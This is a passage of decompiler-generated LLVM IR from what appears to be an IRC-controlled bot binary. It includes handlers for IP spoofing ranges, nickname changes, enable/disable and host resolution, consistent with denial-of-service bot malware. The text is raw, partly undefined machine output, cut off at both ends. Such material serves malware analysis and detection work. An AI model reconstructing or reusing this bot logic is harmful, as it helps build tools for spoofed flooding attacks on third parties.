  uselistorder i32 %v4_8048ca2, { 1, 0, 2 }
  uselistorder i32 %v4_8048c91, { 1, 2, 0 }
  uselistorder i32 %storemerge12.in111, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8048bfb, { 1, 0 }
  uselistorder i32 %v7_8048bf9, { 1, 0 }
  uselistorder i32 %storemerge6120, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8048b9f, { 1, 0 }
  uselistorder i32 %v5_8048b8a124, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_8048b80, { 3, 1, 5, 2, 4, 0 }
  uselistorder i32 %v3_8048b6e, { 10, 5, 6, 0, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i32 %v1_8048a63, { 1, 0, 2 }
  uselistorder i32 %storemerge7, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8048a04.pre-phi, { 3, 0, 4, 2, 1 }
  uselistorder i1 %v0_80489a7, { 1, 0 }
  uselistorder i32 %v4_804893f, { 3, 4, 2, 5, 1, 6, 7, 0, 8 }
  uselistorder i32 %v4_8048910, { 1, 0 }
  uselistorder i1 %v5_80488fa, { 6, 7, 1, 5, 4, 0, 8, 3, 2, 9 }
  uselistorder i32 %v12_80488f4, { 1, 0 }
  uselistorder i32* %stack_var_-5228, { 0, 5, 1, 2, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i1* %cf.global-to-local, { 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 64, 12, 13, 63, 14, 15, 26, 22, 16, 17, 18, 19, 20, 21, 62, 23, 24, 25, 1, 27, 28, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048dc8, { 1, 0 }
  uselistorder label %dec_label_pc_8048d8e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048cf8, { 1, 0 }
  uselistorder label %dec_label_pc_8048cb6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c91, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048c18, { 1, 0 }
  uselistorder label %dec_label_pc_8048bbf, { 1, 0 }
  uselistorder label %dec_label_pc_8048b9f, { 1, 0 }
  uselistorder label %dec_label_pc_8048b1f, { 1, 0 }
  uselistorder label %dec_label_pc_8048ad4, { 1, 0 }
  uselistorder label %dec_label_pc_8048aaf, { 1, 0 }
  uselistorder label %dec_label_pc_8048a01, { 1, 0 }
  uselistorder label %dec_label_pc_80489f5, { 1, 0 }
  uselistorder label %dec_label_pc_8048970, { 1, 0 }
  uselistorder label %dec_label_pc_8048936, { 1, 0 }
}

define i32 @getspoofs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp32 = call i8 @__decompiler_undefined_function_5()
  %tmp33 = call i8 @__decompiler_undefined_function_5()
  %tmp46 = call i8 @__decompiler_undefined_function_5()
  %v0_8048de0 = load i64, i64* @global_var_8074078.34, align 8
  %v1_8048de0 = trunc i64 %v0_8048de0 to i32
  %v9_8048df7 = icmp eq i32 %v1_8048de0, 1
  %v1_8048dfa = icmp eq i1 %v9_8048df7, false
  br i1 %v1_8048dfa, label %dec_label_pc_8048e50, label %dec_label_pc_8048dfc

dec_label_pc_8048dfc:                             ; preds = %entry
  %v3_8048e0c16 = zext i8 %tmp46 to i32
  store i32 %v3_8048e0c16, i32* @ebx, align 4
  %v3_8048e43 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_8068d60.48 to i32))
  br label %dec_label_pc_8048ef8

dec_label_pc_8048e50:                             ; preds = %entry
  %v0_8048dd8 = load i8*, i8** @global_var_8074074.33, align 4
  %v1_8048dd8 = ptrtoint i8* %v0_8048dd8 to i32
  %v3_8048e6f21 = zext i8 %tmp33 to i32
  store i32 %v3_8048e6f21, i32* @ebx, align 4
  %v4_8048e83 = zext i8 %tmp32 to i32
  store i32 %v4_8048e83, i32* @esi, align 4
  %v1_8048e98 = urem i32 %v1_8048dd8, 256
  store i32 %v1_8048e98, i32* @edi, align 4
  %v3_8048ef0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_8068d80.49 to i32))
  br label %dec_label_pc_8048ef8

dec_label_pc_8048ef8:                             ; preds = %dec_label_pc_8048dfc, %dec_label_pc_8048e50
  %v0_8048eff = phi i32 [ %v3_8048ef0, %dec_label_pc_8048e50 ], [ %v3_8048e43, %dec_label_pc_8048dfc ]
  ret i32 %v0_8048eff

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048ef8, { 1, 0 }
}

define i32 @version(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8048f14 = call i32 @Send(i32 %arg1, i32 ptrtoint ([61 x i8]* @global_var_8068db0.50 to i32))
  ret i32 %v3_8048f14
}

define i32 @nickc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_8048f25 = icmp eq i32 %arg3, 1
  br i1 %v12_8048f25, label %dec_label_pc_8048f43, label %dec_label_pc_8048f2b

dec_label_pc_8048f2b:                             ; preds = %entry
  %v3_8048f39 = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8068ded.51 to i32))
  br label %dec_label_pc_8048fa6

dec_label_pc_8048f43:                             ; preds = %entry
  %v1_8048f46 = add i32 %arg4, 4
  %v1_8048f49 = inttoptr i32 %v1_8048f46 to i32*
  %v2_8048f49 = load i32, i32* %v1_8048f49, align 4
  store i1 false, i1* @df, align 1
  %v4_8048f56 = inttoptr i32 %v2_8048f49 to i8*
  store i32 %v2_8048f49, i32* @edi, align 4
  %v3_8048f59 = call i32 @_strlen(i8* %v4_8048f56)
  %v4_8048f59 = mul i32 %v3_8048f59, -1
  %v1_8048f5f = sub i32 0, %v4_8048f59
  %v2_8048f60 = icmp ult i32 %v1_8048f5f, 32
  %v6_8048f60 = icmp eq i32 %v4_8048f59, -32
  %v2_8048f63 = or i1 %v2_8048f60, %v6_8048f60
  br i1 %v2_8048f63, label %dec_label_pc_8048f7d, label %dec_label_pc_8048f65

dec_label_pc_8048f65:                             ; preds = %dec_label_pc_8048f43
  %v3_8048f73 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_8068e08.52 to i32))
  br label %dec_label_pc_8048fa6

dec_label_pc_8048f7d:                             ; preds = %dec_label_pc_8048f43
  %v2_8048f83 = load i32, i32* %v1_8048f49, align 4
  store i32 %v2_8048f83, i32* @global_var_807cb6c.53, align 4
  %v3_8048f9e = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_8068e3e.54 to i32))
  br label %dec_label_pc_8048fa6

dec_label_pc_8048fa6:                             ; preds = %dec_label_pc_8048f65, %dec_label_pc_8048f2b, %dec_label_pc_8048f7d
  %v0_8048faa = phi i32 [ %v3_8048f73, %dec_label_pc_8048f65 ], [ %v3_8048f39, %dec_label_pc_8048f2b ], [ %v3_8048f9e, %dec_label_pc_8048f7d ]
  ret i32 %v0_8048faa

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048fa6, { 2, 0, 1 }
}

define i32 @realrand(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8048fae = load i32, i32* @ebx, align 4
  %v2_8048fb7 = call i32 @__GI_time(i32* null)
  store i32 %v2_8048fb7, i32* @ebx, align 4
  %v1_8048fc1 = call i32 @__libc_getpid(i32 0)
  %v0_8048fc6 = load i32, i32* @ebx, align 4
  %v2_8048fc6 = add i32 %v0_8048fc6, %v1_8048fc1
  %v1_8048fcd = call i32 @srand(i32 %v2_8048fc6)
  %v0_8048fd5 = call i32 @random()
  store i32 %v0_8048fd5, i32* @ecx, align 4
  %v2_8048fe2 = sub i32 1, %arg1
  %v1_8048fe4 = add i32 %v2_8048fe2, %arg2
  %v2_8048feb = ashr i32 %v0_8048fd5, 31
  %v2_8048fee = zext i32 %v0_8048fd5 to i64
  %v4_8048fee = zext i32 %v2_8048feb to i64
  %v5_8048fee = mul nuw i64 %v4_8048fee, 4294967296
  %v6_8048fee = or i64 %v5_8048fee, %v2_8048fee
  %v7_8048fee = zext i32 %v1_8048fe4 to i64
  %v10_8048fee = srem i64 %v6_8048fee, %v7_8048fee
  %v11_8048fee = trunc i64 %v10_8048fee to i32
  store i32 %v11_8048fee, i32* @edx, align 4
  %v5_8048ff2 = add i32 %v11_8048fee, %arg1
  store i32 %v0_8048fae, i32* @ebx, align 4
  ret i32 %v5_8048ff2

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @rndnick(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8049008 = call i32 @realrand(i32 4, i32 8)
  %v1_8049014 = inttoptr i32 %v2_8049008 to i8*
  %v2_8049014 = call i32 @randstring(i8* %v1_8049014)
  store i32 %v2_8049014, i32* @global_var_807cb6c.53, align 4
  store i32 %v2_8049014, i32* @ebx, align 4
  %v0_8049027 = call i32 @getBuild()
  %v3_804903e = call i32 @Send(i32 %arg1, i32 ptrtoint ([16 x i8]* @global_var_8068e49.56 to i32))
  ret i32 %v3_804903e

; uselistorder directives
  uselistorder i32 %v2_8049014, { 1, 0 }
}

define i32 @disable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_8049052 = icmp eq i32 %arg3, 1
  br i1 %v12_8049052, label %dec_label_pc_80490a2, label %dec_label_pc_8049058

dec_label_pc_8049058:                             ; preds = %entry
  %v3_8049066 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8068e59.57 to i32))
  %v3_8049095 = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_8068e9c.60 to i32))
  br label %dec_label_pc_804914e

dec_label_pc_80490a2:                             ; preds = %entry
  %v0_80490a2 = load i8, i8* @global_var_8074070.28, align 16
  %v4_80490a7 = icmp eq i8 %v0_80490a2, 0
  br i1 %v4_80490a7, label %dec_label_pc_80490c6, label %dec_label_pc_80490ab

dec_label_pc_80490ab:                             ; preds = %dec_label_pc_80490a2
  %v3_80490b9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8068ebe.61 to i32))
  br label %dec_label_pc_804914e

dec_label_pc_80490c6:                             ; preds = %dec_label_pc_80490a2
  %v1_80490c9 = add i32 %arg4, 4
  %v1_80490cc = inttoptr i32 %v1_80490c9 to i32*
  %v2_80490cc = load i32, i32* %v1_80490cc, align 4
  store i1 false, i1* @df, align 1
  %v4_80490d9 = inttoptr i32 %v2_80490cc to i8*
  store i32 %v2_80490cc, i32* @edi, align 4
  %v3_80490dc = call i32 @_strlen(i8* %v4_80490d9)
  %v4_80490dc = mul i32 %v3_80490dc, -1
  %v1_80490e2 = sub i32 0, %v4_80490dc
  %v5_80490e3 = icmp ult i32 %v1_80490e2, 254
  %v9_80490e3 = icmp eq i32 %v4_80490dc, -254
  %v2_80490e8 = or i1 %v5_80490e3, %v9_80490e3
  br i1 %v2_80490e8, label %dec_label_pc_8049102, label %dec_label_pc_80490ea

dec_label_pc_80490ea:                             ; preds = %dec_label_pc_80490c6
  %v3_80490f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_8068edc.62 to i32))
  br label %dec_label_pc_804914e

dec_label_pc_8049102:                             ; preds = %dec_label_pc_80490c6
  store i8 1, i8* @global_var_8074070.28, align 16
  %v5_804911a = call i32 @__GI_memset(i8* bitcast (i32* @global_var_807ca60.63 to i8*), i32 0, i32 256)
  %v2_8049128 = load i32, i32* %v1_80490cc, align 4
  store i32 %v2_8049128, i32* @eax, align 4
  %v4_8049133 = call i32 @strcpy(i8* bitcast (i32* @global_var_807ca60.63 to i8*), i32 %v2_8049128)
  %v3_8049146 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_8068f04.64 to i32))
  br label %dec_label_pc_804914e

dec_label_pc_804914e:                             ; preds = %dec_label_pc_80490ea, %dec_label_pc_80490ab, %dec_label_pc_8049058, %dec_label_pc_8049102
  %v0_8049152 = phi i32 [ %v3_80490f8, %dec_label_pc_80490ea ], [ %v3_80490b9, %dec_label_pc_80490ab ], [ %v3_8049095, %dec_label_pc_8049058 ], [ %v3_8049146, %dec_label_pc_8049102 ]
  ret i32 %v0_8049152

; uselistorder directives
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804914e, { 3, 0, 1, 2 }
}

define i32 @enable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_8049159 = icmp eq i32 %arg3, 1
  br i1 %v12_8049159, label %dec_label_pc_80491a6, label %dec_label_pc_804915f

dec_label_pc_804915f:                             ; preds = %entry
  %v3_804916d = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_8068f23.65 to i32))
  %v3_804919c = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_8068e9c.60 to i32))
  br label %dec_label_pc_8049219

dec_label_pc_80491a6:                             ; preds = %entry
  %v0_80491a6 = load i8, i8* @global_var_8074070.28, align 16
  %v4_80491ab = icmp eq i8 %v0_80491a6, 0
  %v1_80491ad = icmp eq i1 %v4_80491ab, false
  br i1 %v1_80491ad, label %dec_label_pc_80491c7, label %dec_label_pc_80491af

dec_label_pc_80491af:                             ; preds = %dec_label_pc_80491a6
  %v3_80491bd = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_8068f3d.66 to i32))
  br label %dec_label_pc_8049219

dec_label_pc_80491c7:                             ; preds = %dec_label_pc_80491a6
  %v1_80491ca = add i32 %arg4, 4
  %v1_80491cd = inttoptr i32 %v1_80491ca to i32*
  %v2_80491cd = load i32, i32* %v1_80491cd, align 4
  %v4_80491d8 = call i32 @__GI_strcasecmp(i8* bitcast (i32* @global_var_807ca60.63 to i8*), i32 %v2_80491cd)
  %v1_80491e0 = icmp eq i32 %v4_80491d8, 0
  br i1 %v1_80491e0, label %dec_label_pc_80491fc, label %dec_label_pc_80491e4

dec_label_pc_80491e4:                             ; preds = %dec_label_pc_80491c7
  %v3_80491f2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8068f5a.67 to i32))
  br label %dec_label_pc_8049219

dec_label_pc_80491fc:                             ; preds = %dec_label_pc_80491c7
  store i8 0, i8* @global_var_8074070.28, align 16
  %v3_8049211 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8068f75.68 to i32))
  br label %dec_label_pc_8049219

dec_label_pc_8049219:                             ; preds = %dec_label_pc_80491e4, %dec_label_pc_80491af, %dec_label_pc_804915f, %dec_label_pc_80491fc
  %v0_804921a = phi i32 [ %v3_80491f2, %dec_label_pc_80491e4 ], [ %v3_80491bd, %dec_label_pc_80491af ], [ %v3_804919c, %dec_label_pc_804915f ], [ %v3_8049211, %dec_label_pc_80491fc ]
  ret i32 %v0_804921a

; uselistorder directives
  uselistorder i8* bitcast (i32* @global_var_807ca60.63 to i8*), { 1, 2, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049219, { 3, 0, 1, 2 }
}

define i32 @spoof(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %v12_8049225 = icmp eq i32 %arg3, 1
  br i1 %v12_8049225, label %dec_label_pc_804925a, label %dec_label_pc_804922b

dec_label_pc_804922b:                             ; preds = %entry
  %v3_8049239 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_8068f94.69 to i32))
  store i32 %v3_8049239, i32* %eax.global-to-local, align 4
  store i8* null, i8** @global_var_8074074.33, align 4
  store i64 0, i64* @global_var_8074078.34, align 8
  br label %dec_label_pc_8049401

dec_label_pc_804925a:                             ; preds = %entry
  %v1_804925d = add i32 %arg4, 4
  store i32 %v1_804925d, i32* %eax.global-to-local, align 4
  %v1_8049260 = inttoptr i32 %v1_804925d to i32*
  %v2_8049260 = load i32, i32* %v1_8049260, align 4
  %v1_804926d = and i32 %v2_8049260, -256
  store i32 %v1_804926d, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8049270 = inttoptr i32 %v2_8049260 to i8*
  store i32 %v2_8049260, i32* @edi, align 4
  %v3_8049276 = call i32 @_strlen(i8* %v4_8049270)
  %v4_8049276 = mul i32 %v3_8049276, -1
  %v1_804927c = sub i32 0, %v4_8049276
  store i32 %v1_804927c, i32* %eax.global-to-local, align 4
  %v2_804927d = icmp ult i32 %v1_804927c, 16
  %v6_804927d = icmp eq i32 %v4_8049276, -16
  %v2_8049280 = or i1 %v2_804927d, %v6_804927d
  br i1 %v2_8049280, label %dec_label_pc_804929d, label %dec_label_pc_8049282

dec_label_pc_8049282:                             ; preds = %dec_label_pc_804925a
  %v3_8049290 = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_8068fb4.70 to i32))
  store i32 %v3_8049290, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049401

dec_label_pc_804929d:                             ; preds = %dec_label_pc_804925a
  store i32 %v1_804925d, i32* %eax.global-to-local, align 4
  %v2_80492a3 = load i32, i32* %v1_8049260, align 4
  %v2_80492a9 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_80492a9, i32* @eax, align 4
  %v3_80492b0 = bitcast i32* %stack_var_-276 to i8*
  %v4_80492b0 = call i32 @strcpy(i8* %v3_80492b0, i32 %v2_80492a3)
  %v2_80492c9 = ptrtoint i32* %stack_var_-512 to i32
  store i32 %v2_80492c9, i32* %eax.global-to-local, align 4
  %v3_80492d2 = call i32 @_strlen(i8* %v3_80492b0)
  %v1_80492d9 = add i32 %v3_80492d2, -1
  store i32 %v1_80492d9, i32* %eax.global-to-local, align 4
  %v0_80492da = load i32, i32* @ebp, align 4
  %v2_80492da = add i32 %v3_80492d2, -273
  %v3_80492da = add i32 %v2_80492da, %v0_80492da
  %v4_80492da = inttoptr i32 %v3_80492da to i8*
  %v5_80492da = load i8, i8* %v4_80492da, align 1
  %v6_80492da = zext i8 %v5_80492da to i32
  %v8_80492da = and i32 %v1_80492d9, -256
  %v9_80492da = or i32 %v6_80492da, %v8_80492da
  store i32 %v9_80492da, i32* %eax.global-to-local, align 4
  %v10_80492e1 = icmp eq i8 %v5_80492da, 46
  %v1_80492e3 = icmp eq i1 %v10_80492e1, false
  br i1 %v1_80492e3, label %dec_label_pc_8049333, label %dec_label_pc_80492e5

dec_label_pc_80492e5:                             ; preds = %dec_label_pc_804929d
  store i32 %v2_80492c9, i32* %eax.global-to-local, align 4
  %v3_80492ff = call i32 @_strlen(i8* %v3_80492b0)
  %v1_8049306 = add i32 %v3_80492ff, -1
  store i32 %v1_8049306, i32* %eax.global-to-local, align 4
  %v0_8049307 = load i32, i32* @ebp, align 4
  %v2_8049307 = add i32 %v3_80492ff, -273
  %v3_8049307 = add i32 %v2_8049307, %v0_8049307
  %v4_8049307 = inttoptr i32 %v3_8049307 to i8*
  store i8 0, i8* %v4_8049307, align 1
  br label %dec_label_pc_8049333

dec_label_pc_804931f:                             ; preds = %dec_label_pc_8049333
  store i32 %stack_var_-20.0, i32* %eax.global-to-local, align 4
  %v0_8049322 = load i32, i32* @ebp, align 4
  %v2_8049322 = add i32 %stack_var_-20.0, -272
  %v3_8049322 = add i32 %v2_8049322, %v0_8049322
  %v4_8049322 = inttoptr i32 %v3_8049322 to i8*
  %v5_8049322 = load i8, i8* %v4_8049322, align 1
  %v6_8049322 = zext i8 %v5_8049322 to i32
  %v8_8049322 = and i32 %stack_var_-20.0, -256
  %v9_8049322 = or i32 %v6_8049322, %v8_8049322
  store i32 %v9_8049322, i32* %eax.global-to-local, align 4
  %v10_8049329 = icmp eq i8 %v5_8049322, 46
  %v1_804932b = icmp eq i1 %v10_8049329, false
  br i1 %v1_804932b, label %dec_label_pc_8049330, label %dec_label_pc_804932d

dec_label_pc_804932d:                             ; preds = %dec_label_pc_804931f
  %v4_804932d = add i32 %stack_var_-16.1, 1
  br label %dec_label_pc_8049330

dec_label_pc_8049330:                             ; preds = %dec_label_pc_804931f, %dec_label_pc_804932d
  %stack_var_-16.0 = phi i32 [ %stack_var_-16.1, %dec_label_pc_804931f ], [ %v4_804932d, %dec_label_pc_804932d ]
  %v4_8049330 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_8049333

dec_label_pc_8049333:                             ; preds = %dec_label_pc_80492e5, %dec_label_pc_804929d, %dec_label_pc_8049330
  %stack_var_-16.1 = phi i32 [ %stack_var_-16.0, %dec_label_pc_8049330 ], [ 1, %dec_label_pc_804929d ], [ 1, %dec_label_pc_80492e5 ]
  %stack_var_-20.0 = phi i32 [ %v4_8049330, %dec_label_pc_8049330 ], [ 0, %dec_label_pc_804929d ], [ 0, %dec_label_pc_80492e5 ]
  store i32 %stack_var_-20.0, i32* @edx, align 4
  store i32 %v2_80492c9, i32* %eax.global-to-local, align 4
  %v3_8049350 = call i32 @_strlen(i8* %v3_80492b0)
  store i32 %v3_8049350, i32* %eax.global-to-local, align 4
  %v0_8049357 = load i32, i32* @edx, align 4
  %v7_8049357 = icmp ult i32 %v0_8049357, %v3_8049350
  br i1 %v7_8049357, label %dec_label_pc_804931f, label %dec_label_pc_804935b

dec_label_pc_804935b:                             ; preds = %dec_label_pc_8049333
  %v5_8049360 = sub i32 4, %stack_var_-16.1
  %v15_8049360 = icmp eq i32 %v5_8049360, 0
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_80493ab31 = icmp sgt i32 %v5_8049360, 0
  br i1 %v5_80493ab31, label %dec_label_pc_804936f, label %dec_label_pc_80493ad

dec_label_pc_804936f:                             ; preds = %dec_label_pc_804935b, %dec_label_pc_804936f
  %storemerge232 = phi i32 [ %v4_80493a2, %dec_label_pc_804936f ], [ 0, %dec_label_pc_804935b ]
  store i32 %v2_80492a9, i32* @edx, align 4
  store i32 %v2_80492c9, i32* %eax.global-to-local, align 4
  %v3_804938f = call i32 @_strlen(i8* %v3_80492b0)
  %v0_8049396 = load i32, i32* @edx, align 4
  %v0_804939633 = add i32 %v0_8049396, %v3_804938f
  store i32 %v0_804939633, i32* %eax.global-to-local, align 4
  %v1_8049399 = inttoptr i32 %v0_804939633 to i16*
  store i16 12334, i16* %v1_8049399, align 2
  %v0_804939e = load i32, i32* %eax.global-to-local, align 4
  %v1_804939e = add i32 %v0_804939e, 2
  %v2_804939e = inttoptr i32 %v1_804939e to i8*
  store i8 0, i8* %v2_804939e, align 1
  %v4_80493a2 = add nuw nsw i32 %storemerge232, 1
  store i32 %v4_80493a2, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_80493a2, %v5_8049360
  br i1 %exitcond, label %dec_label_pc_80493ad, label %dec_label_pc_804936f

dec_label_pc_80493ad:                             ; preds = %dec_label_pc_804936f, %dec_label_pc_804935b
  %v15_80493b6 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %v2_80492a9, i32* %eax.global-to-local, align 4
  %v4_80493c1 = call i32 @inet_aton(i8* %v3_80492b0, i32 %v15_80493b6)
  %v3_80493c9 = load i32, i32* %stack_var_-288, align 4
  store i32 %v3_80493c9, i32* %eax.global-to-local, align 4
  %v1_80493d6 = icmp eq i1 %v15_8049360, false
  br i1 %v1_80493d6, label %dec_label_pc_80493e4, label %dec_label_pc_80493f9

dec_label_pc_80493e4:                             ; preds = %dec_label_pc_80493ad
  %v3_80493ec = call i32 @pow(i64 256, i32 %v5_8049360)
  store i32 %v3_80493ec, i32* %eax.global-to-local, align 4
  %v1_80493f4 = sext i32 %v3_80493ec to i64
  br label %dec_label_pc_80493f9

dec_label_pc_80493f9:                             ; preds = %dec_label_pc_80493ad, %dec_label_pc_80493e4
  %storemerge = phi i64 [ %v1_80493f4, %dec_label_pc_80493e4 ], [ 1, %dec_label_pc_80493ad ]
  store i64 %storemerge, i64* @global_var_8074078.34, align 8
  store i32 %v3_80493c9, i32* %eax.global-to-local, align 4
  %v1_80493fc = inttoptr i32 %v3_80493c9 to i8*
  store i8* %v1_80493fc, i8** @global_var_8074074.33, align 4
  br label %dec_label_pc_8049401

dec_label_pc_8049401:                             ; preds = %dec_label_pc_8049282, %dec_label_pc_804922b, %dec_label_pc_80493f9
  %v0_8049405 = phi i32 [ %v3_8049290, %dec_label_pc_8049282 ], [ %v3_8049239, %dec_label_pc_804922b ], [ %v3_80493c9, %dec_label_pc_80493f9 ]
  ret i32 %v0_8049405

; uselistorder directives
  uselistorder i32 %v3_80493c9, { 0, 2, 1, 3 }
  uselistorder i32 %v4_80493a2, { 1, 2, 0 }
  uselistorder i32 %v5_8049360, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-20.0, { 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_80492c9, { 1, 2, 0, 3 }
  uselistorder i8* %v3_80492b0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v1_804927c, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 8, 5, 6, 7, 0, 11, 12, 9, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049401, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80493f9, { 1, 0 }
  uselistorder label %dec_label_pc_804936f, { 1, 0 }
  uselistorder label %dec_label_pc_8049333, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049330, { 1, 0 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8049412 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_8049412, i32* @global_var_8074480.71, align 128
  %v10_8049424 = icmp eq i32 %v1_8049412, -1
  %v1_8049427 = icmp eq i1 %v10_8049424, false
  br i1 %v1_8049427, label %dec_label_pc_8049486, label %dec_label_pc_8049429

dec_label_pc_8049429:                             ; preds = %entry
  %v1_804942f = call i32 @__GI_gethostbyname(i32 %arg2)
  %v4_804943a = icmp eq i32 %v1_804942f, 0
  %v1_804943e = icmp eq i1 %v4_804943a, false
  br i1 %v1_804943e, label %dec_label_pc_8049463, label %dec_label_pc_8049440

dec_label_pc_8049440:                             ; preds = %dec_label_pc_8049429
  %v0_8049440 = load i32, i32* @global_var_807cb70.29, align 16
  %v2_8049451 = call i32 @Send(i32 %v0_8049440, i32 ptrtoint ([33 x i8]* @global_var_8069000.72 to i32))
  %v1_804945e = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8049463

dec_label_pc_8049463:                             ; preds = %dec_label_pc_8049429, %dec_label_pc_8049440
  %v1_8049466 = add i32 %v1_804942f, 12
  %v2_8049466 = inttoptr i32 %v1_8049466 to i32*
  %v3_8049466 = load i32, i32* %v2_8049466, align 4
  %v1_8049473 = add i32 %v1_804942f, 16
  %v2_8049473 = inttoptr i32 %v1_8049473 to i32*
  %v3_8049473 = load i32, i32* %v2_8049473, align 4
  %v1_8049476 = inttoptr i32 %v3_8049473 to i32*
  %v2_8049476 = load i32, i32* %v1_8049476, align 4
  %v3_804947e = call i32 @bcopy(i32 %v2_8049476, i32 ptrtoint (i32* @global_var_8074480.71 to i32), i32 %v3_8049466)
  %v0_8049486.pre = load i32, i32* @global_var_8074480.71, align 128
  br label %dec_label_pc_8049486

dec_label_pc_8049486:                             ; preds = %entry, %dec_label_pc_8049463
  %v0_8049486 = phi i32 [ %v1_8049412, %entry ], [ %v0_8049486.pre, %dec_label_pc_8049463 ]
  ret i32 %v0_8049486

; uselistorder directives
  uselistorder i32 %v1_8049412, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049486, { 1, 0 }
  uselistorder label %dec_label_pc_8049463, { 1, 0 }
}

define i32 @ChangetoDnsNameFormat() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_3()
  %tmp9 = call i16* @__decompiler_undefined_function_1()
  %v4_804949b = ptrtoint i16* %tmp9 to i32
  store i32 %v4_804949b, i32* %edx.global-to-local, align 4
  %v4_80494ab = bitcast i16* %tmp9 to i8*
  %v3_80494ae = call i32 @_strlen(i8* %v4_80494ab)
  %v2_80494b5 = add i32 %v4_804949b, %v3_80494ae
  %v1_80494b7 = inttoptr i32 %v2_80494b5 to i16*
  store i16 46, i16* %v1_80494b7, align 2
  br label %dec_label_pc_8049506

dec_label_pc_80494c5:                             ; preds = %dec_label_pc_8049506
  %v6_80494c8 = add i32 %v4_8049506, %v4_804949b
  %v1_80494cb = inttoptr i32 %v6_80494c8 to i8*
  %v2_80494cb = load i8, i8* %v1_80494cb, align 1
  %v10_80494cd = icmp eq i8 %v2_80494cb, 46
  %v1_80494cf = icmp eq i1 %v10_80494cd, false
  br i1 %v1_80494cf, label %dec_label_pc_8049503, label %dec_label_pc_80494d1

dec_label_pc_80494d1:                             ; preds = %dec_label_pc_80494c5
  %v3_80494d4 = and i32 %v4_8049506, -256
